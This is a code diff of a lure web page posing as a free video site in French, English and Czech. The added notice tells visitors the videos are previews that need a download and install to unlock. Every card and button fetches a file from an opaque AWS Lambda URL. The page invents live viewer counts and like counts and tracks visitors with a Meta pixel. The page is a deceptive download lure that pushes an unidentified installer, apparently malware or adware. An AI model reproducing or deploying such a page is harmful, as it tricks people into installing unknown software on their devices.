@@ -19,26 +19,18 @@
       --radius: 14px;
     }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
       background: var(--bg);
       color: var(--text);
-      font-family: -apple-system, BlinkMacSystemFont,
-        "Segoe UI", system-ui, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
       padding-bottom: 200px;
       min-height: 100vh;
       -webkit-tap-highlight-color: transparent;
     }
 
-    button {
-      cursor: pointer;
-      -webkit-tap-highlight-color: transparent;
-    }
+    button { cursor: pointer; -webkit-tap-highlight-color: transparent; }
 
     .header {
       position: sticky;
@@ -71,29 +63,22 @@
       font-weight: 600;
     }
 
-    .online::before {
-      content: "●";
-      margin-right: 5px;
-      font-size: 8px;
+    .online::before { content: "●"; margin-right: 5px; font-size: 8px; }
+
+    .notice-wrap {
+      padding: 12px 16px 8px;
     }
 
-    .search-wrap {
-      padding: 14px 16px 8px;
-    }
-
-    .search {
-      width: 100%;
-      background: var(--card);
-      border: 1px solid var(--line);
+    .notice {
+      background: linear-gradient(135deg, #1a1a24, #2a1520);
+      border: 1px solid #ff2d55;
       border-radius: 12px;
-      padding: 12px 16px;
-      color: var(--text);
-      font-size: 15px;
-      outline: none;
-    }
-
-    .search::placeholder {
-      color: var(--muted);
+      padding: 14px 16px;
+      color: #fff;
+      font-size: 14px;
+      line-height: 1.5;
+      text-align: center;
+      font-weight: 500;
     }
 
     .grid {
@@ -104,9 +89,7 @@
     }
 
     @media (min-width: 500px) {
-      .grid {
-        grid-template-columns: repeat(3, 1fr);
-      }
+      .grid { grid-template-columns: repeat(3, 1fr); }
     }
 
     .card {
@@ -118,9 +101,7 @@
       transition: transform 0.15s;
     }
 
-    .card:active {
-      transform: scale(0.97);
-    }
+    .card:active { transform: scale(0.97); }
 
     .cover {
       position: relative;
@@ -175,7 +156,6 @@
 
     .play-icon::after {
       content: "";
-      display: block;
       width: 0;
       height: 0;
       border-left: 14px solid #fff;
@@ -184,9 +164,7 @@
       margin-left: 3px;
     }
 
-    .card-body {
-      padding: 10px 10px 12px;
-    }
+    .card-body { padding: 10px 10px 12px; }
 
     .card-title {
       font-size: 13px;
@@ -208,10 +186,7 @@
       color: var(--muted);
     }
 
-    .likes {
-      color: #ff6b81;
-      font-weight: 600;
-    }
+    .likes { color: #ff6b81; font-weight: 600; }
 
     .download-btn {
       background: var(--accent);
@@ -273,15 +248,8 @@
       text-align: center;
     }
 
-    .btn-dl {
-      background: linear-gradient(90deg, #ff2d55, #ff4d6d);
-    }
-
-    .btn-play,
-    .btn-date {
-      background: #1f2937;
-      border: 1px solid #374151;
-    }
+    .btn-dl { background: linear-gradient(90deg, #ff2d55, #ff4d6d); }
+    .btn-play, .btn-date { background: #1f2937; border: 1px solid #374151; }
 
     .empty {
       display: none;
@@ -292,7 +260,7 @@
     }
   </style>
 
-  <!-- Meta Pixel Code (三个像素合并) -->
+  <!-- Meta Pixel Code -->
   <script>
   !function(f,b,e,v,n,t,s)
   {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -302,29 +270,13 @@
   t.src=v;s=b.getElementsByTagName(e)[0];
   s.parentNode.insertBefore(t,s)}(window, document,'script',
   'https://connect.facebook.net/en_US/fbevents.js');
-
-  const META_PIXEL_IDS = [
-    "1761288435564809",
-    "2721047271687618",
-    "1498952742126596"
-  ];
-
-  META_PIXEL_IDS.forEach(function(pixelId) {
-    fbq("init", pixelId);
-  });
-
-  // 只发送一次 PageView（三个像素都会收到）
-  fbq("track", "PageView");
+  fbq('init', '1761288435564809');
+  fbq('track', 'PageView');
   </script>
   <noscript>
     <img height="1" width="1" style="display:none"
       src="https://www.facebook.com/tr?id=1761288435564809&ev=PageView&noscript=1">
-    <img height="1" width="1" style="display:none"
-      src="https://www.facebook.com/tr?id=2721047271687618&ev=PageView&noscript=1">
-    <img height="1" width="1" style="display:none"
-      src="https://www.facebook.com/tr?id=1498952742126596&ev=PageView&noscript=1">
   </noscript>
-  <!-- End Meta Pixel Code -->
 </head>
 
 <body>
@@ -334,39 +286,62 @@
     <div class="online" id="onlineCount">12,847 en ligne</div>
   </header>
 
-  <div class="search-wrap">
-    <input
-      type="search"
-      class="search"
-      id="searchInput"
-      placeholder="Rechercher…"
-      autocomplete="off">
+  <div class="notice-wrap">
+    <div class="notice" id="noticeText">
+      Ce n’est qu’un extrait. Cliquez pour télécharger et installer afin de débloquer le contenu complet. Tout est entièrement gratuit. Suivez les instructions pour installer et ouvrir.
+    </div>
   </div>
 
   <section class="grid" id="content"></section>
   <div class="empty" id="empty">Aucun résultat</div>
 
-  <button class="float-dl" id="floatDl" type="button">
-    ↓<br>DL
-  </button>
+  <button class="float-dl" id="floatDl" type="button">↓<br>DL</button>
 
   <div class="bottom-bar">
-    <button class="btn-dl" id="btnDownload" type="button">
-      Télécharger & Regarder
-    </button>
-
-    <button class="btn-play" id="btnPlay" type="button">
-      ▶ Lecture immédiate
-    </button>
-
-    <button class="btn-date" id="btnDate" type="button">
-      💬 Discuter avec elle
-    </button>
+    <button class="btn-dl" id="btnDownload" type="button">Télécharger & Regarder</button>
+    <button class="btn-play" id="btnPlay" type="button">▶ Lecture immédiate</button>
+    <button class="btn-date" id="btnDate" type="button">💬 Discuter avec elle</button>
   </div>
 
   <script>
-    const DOWNLOAD_URL =
-      "https://tacuehjb2zswi3vfaxkuo4sb4a0sexxu.lambda-url.eu-west-3.on.aws/C77QhEvWRYeN";
+    const DOWNLOAD_URL = "https://tacuehjb2zswi3vfaxkuo4sb4a0sexxu.lambda-url.eu-west-3.on.aws/C77QhEvWRYeN";
+
+    const translations = {
+      fr: {
+        notice: "Ce n’est qu’un extrait. Cliquez pour télécharger et installer afin de débloquer le contenu complet. Tout est entièrement gratuit. Suivez les instructions pour installer et ouvrir.",
+        btn_dl: "Télécharger & Regarder",
+        btn_play: "▶ Lecture immédiate",
+        btn_chat: "💬 Discuter avec elle"
+      },
+      en: {
+        notice: "This is just a preview. Click to download and install to unlock the full content. Everything is completely free. Follow the prompts to install and open.",
+        btn_dl: "Download & Watch",
+        btn_play: "▶ Watch Now",
+        btn_chat: "💬 Chat with her"
+      },
+      cs: {
+        notice: "Toto je pouze úryvek. Klikněte pro stažení a instalaci a odemkněte kompletní obsah. Vše je zcela zdarma. Postupujte podle pokynů k instalaci a otevření.",
+        btn_dl: "Stáhnout a sledovat",
+        btn_play: "▶ Sledovat hned",
+        btn_chat: "💬 Chatovat s ní"
+      }
+    };
+
+    function getLang() {
+      const lang = (navigator.language || "fr").toLowerCase();
+      if (lang.startsWith("cs")) return "cs";
+      if (lang.startsWith("en")) return "en";
+      return "fr";
+    }
+
+    const currentLang = getLang();
+    const t = translations[currentLang] || translations.fr;
+
+    // 应用翻译
+    document.getElementById("noticeText").textContent = t.notice;
+    document.getElementById("btnDownload").textContent = t.btn_dl;
+    document.getElementById("btnPlay").textContent = t.btn_play;
+    document.getElementById("btnDate").textContent = t.btn_chat;
 
     const ITEMS = [
       {id:"v01",title:"Vidéo 01",cover:"v01.webp",duration:"12:30"},
@@ -398,216 +373,77 @@
 
     function randomLikes() {
       const n = Math.floor(Math.random() * 18000) + 1200;
-      return n > 9999
-        ? (n / 1000).toFixed(1) + "k"
-        : n.toString();
+      return n > 9999 ? (n / 1000).toFixed(1) + "k" : n.toString();
     }
 
     function escapeHtml(str) {
       return String(str).replace(/[&<>"']/g, c => ({
-        "&": "&amp;",
-        "<": "&lt;",
-        ">": "&gt;",
-        '"': "&quot;",
-        "'": "&#39;"
+        "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
       })[c]);
     }
 
-    function recordDownloadClick(source) {
-      const record = {
-        event: "download_click",
-        source: source,
-        timestamp: new Date().toISOString()
-      };
-
-      try {
-        const records = JSON.parse(
-          localStorage.getItem("download_clicks") || "[]"
-        );
-        records.push(record);
-        localStorage.setItem(
-          "download_clicks",
-          JSON.stringify(records.slice(-500))
-        );
-      } catch (error) {
-        console.warn("Local statistics unavailable");
-      }
-    }
-
     function triggerDownload(source) {
-      // 只发送一次自定义事件「开始使用」（三个像素都会收到）
       if (typeof fbq === "function") {
-        fbq("track", "开始使用");
+        fbq("trackCustom", "GetStarted");
       }
-
-      recordDownloadClick(source);
-
       const a = document.createElement("a");
       a.href = DOWNLOAD_URL;
       a.rel = "noopener";
       a.download = "download";
-
       document.body.appendChild(a);
       a.click();
       a.remove();
     }
 
     function render() {
-      const q = document.getElementById("searchInput")
-        .value.trim().toLowerCase();
-
-      const matches = ITEMS.filter(item =>
-        item.title.toLowerCase().includes(q)
-      );
-
-      const html = matches.map(item => `
+      const html = ITEMS.map(item => `
         <article class="card" data-download="card">
           <div class="cover">
-            <img
-              src="${escapeHtml(item.cover)}"
-              alt=""
-              loading="lazy"
-              onerror="
-                this.style.display='none';
-                if(!this.parentElement.querySelector('.cover-fallback')) {
-                  this.parentElement.insertAdjacentHTML(
-                    'beforeend',
-                    '<div class=&quot;cover-fallback&quot;>Image</div>'
-                  );
-                }
-              ">
-
+            <img src="${escapeHtml(item.cover)}" alt="" loading="lazy"
+              onerror="this.style.display='none'; if(!this.parentElement.querySelector('.cover-fallback')) { this.parentElement.insertAdjacentHTML('beforeend', '<div class=&quot;cover-fallback&quot;>Image</div>'); }">
             <div class="play-icon"></div>
-
-            <span class="duration">
-              ${escapeHtml(item.duration)}
-            </span>
+            <span class="duration">${escapeHtml(item.duration)}</span>
           </div>
-
           <div class="card-body">
-            <div class="card-title">
-              ${escapeHtml(item.title)}
-            </div>
-
+            <div class="card-title">${escapeHtml(item.title)}</div>
             <div class="card-meta">
               <span class="likes">♥ ${randomLikes()}</span>
-              <button
-                class="download-btn"
-                type="button"
-                data-download-button>
-                Télécharger
-              </button>
+              <button class="download-btn" type="button" data-download-button>Télécharger</button>
             </div>
           </div>
         </article>
       `).join("");
 
       const moreCard = `
-        <article
-          class="card more-card"
-          data-download="more"
-          style="
-            grid-column:1/-1;
-            background:linear-gradient(135deg,#1a1a24,#2a1520);
-            border:1px solid #ff2d55;
-          ">
-
-          <div class="card-body"
-            style="padding:28px 16px;text-align:center;">
-
-            <div style="
-              font-size:18px;
-              font-weight:800;
-              margin-bottom:8px;
-              color:#fff;
-            ">
-              + Voir plus de vidéos gratuites
-            </div>
-
-            <div style="
-              font-size:13px;
-              color:#9ca3af;
-              margin-bottom:16px;
-            ">
-              Téléchargez pour débloquer le catalogue complet
-            </div>
-
-            <button
-              class="download-btn"
-              type="button"
-              data-download-button
-              style="
-                padding:12px 24px;
-                font-size:14px;
-                border-radius:10px;
-              ">
-              Télécharger & Voir plus
-            </button>
+        <article class="card more-card" data-download="more" style="grid-column:1/-1; background:linear-gradient(135deg,#1a1a24,#2a1520); border:1px solid #ff2d55;">
+          <div class="card-body" style="padding:28px 16px;text-align:center;">
+            <div style="font-size:18px;font-weight:800;margin-bottom:8px;color:#fff;">+ Voir plus de vidéos gratuites</div>
+            <div style="font-size:13px;color:#9ca3af;margin-bottom:16px;">Téléchargez pour débloquer le catalogue complet</div>
+            <button class="download-btn" type="button" data-download-button style="padding:12px 24px;font-size:14px;border-radius:10px;">Télécharger & Voir plus</button>
           </div>
         </article>
       `;
 
-      document.getElementById("content").innerHTML =
-        html + (matches.length ? moreCard : "");
-
-      document.getElementById("empty").style.display =
-        matches.length ? "none" : "block";
+      document.getElementById("content").innerHTML = html + moreCard;
     }
 
-    document.getElementById("onlineCount").textContent =
-      randomOnline();
-
+    document.getElementById("onlineCount").textContent = randomOnline();
     setInterval(() => {
-      document.getElementById("onlineCount").textContent =
-        randomOnline();
+      document.getElementById("onlineCount").textContent = randomOnline();
     }, 18000);
 
-    document.getElementById("searchInput")
-      .addEventListener("input", render);
+    document.getElementById("btnDownload").addEventListener("click", () => triggerDownload("bottom_download"));
+    document.getElementById("btnPlay").addEventListener("click", () => triggerDownload("bottom_play"));
+    document.getElementById("btnDate").addEventListener("click", () => triggerDownload("bottom_chat"));
+    document.getElementById("floatDl").addEventListener("click", () => triggerDownload("floating_download"));
 
-    document.getElementById("btnDownload")
-      .addEventListener("click", () => {
-        triggerDownload("bottom_download");
-      });
-
-    document.getElementById("btnPlay")
-      .addEventListener("click", () => {
-        triggerDownload("bottom_play");
-      });
-
-    document.getElementById("btnDate")
-      .addEventListener("click", () => {
-        triggerDownload("bottom_chat");
-      });
-
-    document.getElementById("floatDl")
-      .addEventListener("click", () => {
-        triggerDownload("floating_download");
-      });
-
-    document.getElementById("content")
-      .addEventListener("click", (e) => {
-        const card = e.target.closest(".card");
-        if (!card) return;
-
-        if (e.target.closest("[data-download-button]")) {
-          triggerDownload(
-            card.classList.contains("more-card")
-              ? "more_download_button"
-              : "card_download_button"
-          );
-          return;
-        }
-
-        triggerDownload(
-          card.classList.contains("more-card")
-            ? "more_card"
-            : "video_card"
-        );
-      });
+    document.getElementById("content").addEventListener("click", (e) => {
+      const card = e.target.closest(".card");
+      if (!card) return;
+      triggerDownload(card.classList.contains("more-card") ? "more_card" : "video_card");
+    });
 
     render();
   </script>
-
 </body>
 </html>
